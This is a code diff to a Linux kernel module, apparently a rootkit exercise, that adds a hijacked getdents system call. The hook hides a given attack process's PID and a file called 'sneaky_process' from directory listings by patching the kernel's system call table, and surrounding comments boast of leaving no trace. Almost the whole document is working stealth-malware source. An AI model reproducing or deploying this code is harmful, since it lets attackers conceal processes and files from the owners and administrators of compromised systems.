@@ -9,12 +9,30 @@
 #include <linux/module.h> // for all modules
 #include <linux/sched.h>
 
+#define PATHNAME_MAX 256
+
 // Macros for kernel functions to alter Control Register 0 (CR0)
 // This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 // Bit 0 is the WP-bit (write protection). We want to flip this to 0
 // so that we can change the read/write permissions of kernel pages.
 #define read_cr0() (native_read_cr0())
 #define write_cr0(x) (native_write_cr0(x))
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Kai Zhang");
+
+struct linux_dirent {
+  long d_ino;
+  off_t d_off;
+  unsigned short d_reclen;
+  char d_name[];
+};
+
+// Module parameters
+static char *sneaky_pid = "";
+module_param(sneaky_pid, charp, 0000);
+MODULE_PARM_DESC(sneaky_pid,
+                 "The pid of the attack program which load this module");
 
 // These are function pointers to the system calls that change page
 // permissions for the given address (page) to read-only or read-write.
@@ -29,11 +47,48 @@ void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
 // We're getting its adddress from the System.map file (see above).
 static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 
+// Function pointer will be used to save address of original 'getdents' syscall.
+asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,
+                                    unsigned int count);
+
 // Function pointer will be used to save address of original 'open' syscall.
 // The asmlinkage keyword is a GCC #define that indicates this function
 // should expect to find its arguments on the stack (not in registers).
 // This is used for all system calls.
 asmlinkage int (*original_call)(const char *pathname, int flags);
+
+// Define our new sneaky version of the "getdents" syscall
+asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
+                                   unsigned int count) {
+  // Call the original 'getdents'
+  int numBytes = original_getdents(fd, dirp, count);
+
+  int pos = 0;
+
+  while (pos < numBytes) {
+    struct linux_dirent *curr_dirp =
+        (struct linux_dirent *)((char *)dirp + pos);
+    int len = curr_dirp->d_reclen;
+    char d_type = *((char *)curr_dirp + len - 1);
+
+    // Process ID or regular file named "sneaky_process" found
+    if (strcmp(curr_dirp->d_name, sneaky_pid) == 0 ||
+        (strcmp(curr_dirp->d_name, "sneaky_process") == 0 &&
+         d_type == DT_REG)) {
+      // Remove the current linux_dirent struct
+      char *next_dirp = (char *)curr_dirp + len;
+      size_t remaining_len = numBytes - pos - len;
+      memcpy(curr_dirp, next_dirp, remaining_len);
+
+      return numBytes - len;
+    }
+
+    // Not found
+    pos += len;
+  }
+
+  return numBytes;
+}
 
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
@@ -55,6 +110,12 @@ static int initialize_sneaky_module(void) {
   page_ptr = virt_to_page(&sys_call_table);
   // Make this page read-write accessible
   pages_rw(page_ptr, 1);
+
+  // Save away the original 'getdents' system call.
+  // Then overwrite its address in the system call
+  // table with the function address of our new code.
+  original_getdents = (void *)*(sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
   // This is the magic! Save away the original 'open' system call
   // function address. Then overwrite its address in the system call
@@ -83,6 +144,9 @@ static void exit_sneaky_module(void) {
   page_ptr = virt_to_page(&sys_call_table);
   // Make this page read-write accessible
   pages_rw(page_ptr, 1);
+
+  // Restore the original 'getdents' system call function address.
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
 
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
